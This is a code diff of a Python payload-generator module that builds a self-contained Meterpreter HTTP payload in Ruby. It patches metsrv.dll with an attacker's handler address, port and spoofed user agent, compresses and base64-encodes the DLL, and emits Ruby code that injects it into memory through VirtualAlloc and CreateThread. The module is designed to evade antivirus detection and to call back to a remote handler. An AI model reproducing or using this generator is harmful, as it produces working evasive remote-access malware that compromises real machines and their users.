@@ -1,8 +1,8 @@
 """
 
-Reads in metsrv.dll, patches it with appropriate options for a 
-meterpreter reverse_https payload compresses/bas64 encodes it 
-and then builds a ruby injection wrapper to inject the contained 
+Reads in metsrv.dll, patches it with appropriate options for a
+meterpreter reverse_https payload compresses/bas64 encodes it
+and then builds a ruby injection wrapper to inject the contained
 meterpreter dll into memory.
 
 A lot of code taken from the python contained modules and modified for ruby
@@ -15,87 +15,52 @@ Module by @christruncer
 import struct, string, random, sys, os
 
 from modules.common import helpers
-from modules.common import encryption
+#from modules.common import encryption
+from modules.common import patch
 
 import settings
 
 
 class Payload:
-    
+
     def __init__(self):
         # required options
         self.description = "Self contained meterpreter http ruby payload"
         self.language = "ruby"
         self.extension = "rb"
         self.rating = "Normal"
-        
-        # options we require user interaction for- format is {Option : [Value, Description]]}
-        self.required_options = {"compile_to_exe" : ["Y", "Compile to an executable"],
-                                 "inject_method" : ["virtual", "[virtual]alloc"],
-                                 "LHOST" : ["", "IP of the metasploit handler"],
-                                 "LPORT" : ["80", "Port of the metasploit handler"]}
-        
-        
-    # helper for the metasploit http checksum algorithm
-    def checksum8(self, s):
-        # hard rubyish way -> return sum([struct.unpack('<B', ch)[0] for ch in s]) % 0x100
-        return sum([ord(ch) for ch in s]) % 0x100
 
-    # generate a metasploit http handler compatible checksum for the URL
-    def genHTTPChecksum(self, value="CONN"):
-        checkValue = 0
-        if value == "INITW": checkValue = 92 # normal initiation
-        if value == "INITJ": checkValue = 88
-        else: checkValue = 98 # 'CONN', for existing/"orphaned" connections
-        
-        chk = string.ascii_letters + string.digits
-        for x in xrange(64):
-            uri = "".join(random.sample(chk,3))
-            r = "".join(sorted(list(string.ascii_letters+string.digits), key=lambda *args: random.random()))
-            for char in r:
-                if self.checksum8(uri + char) == checkValue:
-                    return uri + char
+        # options we require user interaction for- format is {OPTION : [Value, Description]]}
+        self.required_options = {
+                                    "COMPILE_TO_EXE" : ["Y", "Compile to an executable"],
+                                    #"USE_CRYPTER"    : ["N", "Use the Ruby encrypter"],
+                                    "INJECT_METHOD"  : ["virtual", "[virtual]alloc"],
+                                    "LHOST"          : ["", "IP of the Metasploit handler"],
+                                    "LPORT"          : ["80", "Port of the Metasploit handler"]
+                                }
+
 
     def generate(self):
 
-        # lambda function used for patching the metsvc.dll
-        dllReplace = lambda dll,ind,s: dll[:ind] + s + dll[ind+len(s):]
+        # get the main meterpreter .dll with the header/loader patched
+        meterpreterDll = patch.headerPatch()
 
-        # patch the metsrv.dll header
-        meterpreterDll, headerPatch = helpers.selfcontained_patch()
-        meterpreterDll = dllReplace(meterpreterDll,0,headerPatch)
+        # turn on SSL
+        meterpreterDll = patch.patchTransport(meterpreterDll, False)
 
-        # patch in the default user agent string
-        userAgentIndex = meterpreterDll.index("METERPRETER_UA\x00")
-        userAgentString = "Mozilla/4.0 (compatible; MSIE 6.1; Windows NT)\x00"
-        meterpreterDll = dllReplace(meterpreterDll,userAgentIndex,userAgentString)
+        # replace the URL
+        urlString = "http://" + self.required_options['LHOST'][0] + ":" + str(self.required_options['LPORT'][0]) + "/" + helpers.genHTTPChecksum() + "/\x00"
+        meterpreterDll = patch.patchURL(meterpreterDll, urlString)
 
-        # turn off SSL
-        sslIndex = meterpreterDll.index("METERPRETER_TRANSPORT_SSL")
-        sslString = "METERPRETER_TRANSPORT_HTTP\x00"
-        meterpreterDll = dllReplace(meterpreterDll,sslIndex,sslString)
-
-        # replace the URL/port of the handler
-        urlIndex = meterpreterDll.index("https://" + ("X" * 256))
-        urlString = "http://" + self.required_options['LHOST'][0] + ":" + str(self.required_options['LPORT'][0]) + "/" + self.genHTTPChecksum() + "_" + helpers.randomString(16) + "/\x00"
-        meterpreterDll = dllReplace(meterpreterDll,urlIndex,urlString)
-        
-        # replace the expiration timeout with the default value of 300
-        expirationTimeoutIndex = meterpreterDll.index(struct.pack('<I', 0xb64be661))
-        expirationTimeout = struct.pack('<I', 604800)
-        meterpreterDll = dllReplace(meterpreterDll,expirationTimeoutIndex,expirationTimeout)
-
-        # replace the communication timeout with the default value of 300
-        communicationTimeoutIndex = meterpreterDll.index(struct.pack('<I', 0xaf79257f))
-        communicationTimeout = struct.pack('<I', 300)
-        meterpreterDll = dllReplace(meterpreterDll,communicationTimeoutIndex,communicationTimeout)
+        # replace in the UA
+        meterpreterDll = patch.patchUA(meterpreterDll, "Mozilla/4.0 (compatible; MSIE 6.1; Windows NT)\x00")
 
         # compress/base64 encode the dll
         compressedDll = helpers.deflate(meterpreterDll)
-        
+
         # actually build out the payload
         payloadCode = ""
-        
+
         payloadCode = "require 'rubygems';require 'win32/api';require 'socket';require 'base64';require 'zlib';include Win32\n"
         payloadCode += "exit if Object.const_defined?(:Ocra)\n"
 
@@ -124,5 +89,8 @@ class Payload:
         payloadCode += "%s = %s\n" %(payloadName, Shellcode)
         payloadCode += "%s = v.call(0,(%s.length > 0x1000 ? %s.length : 0x1000), 0x1000, 0x40)\n" %(ptrName,payloadName,payloadName)
         payloadCode += "x = r.call(%s,%s,%s.length); %s = c.call(0,0,%s,0,0,0); x = w.call(%s,0xFFFFFFF)\n" %(ptrName,payloadName,payloadName,threadName,ptrName,threadName)
+
+        #if self.required_options["USE_CRYPTER"][0].lower() == "y":
+        #    payloadCode = encryption.rubyCrypter(payloadCode)
 
         return payloadCode
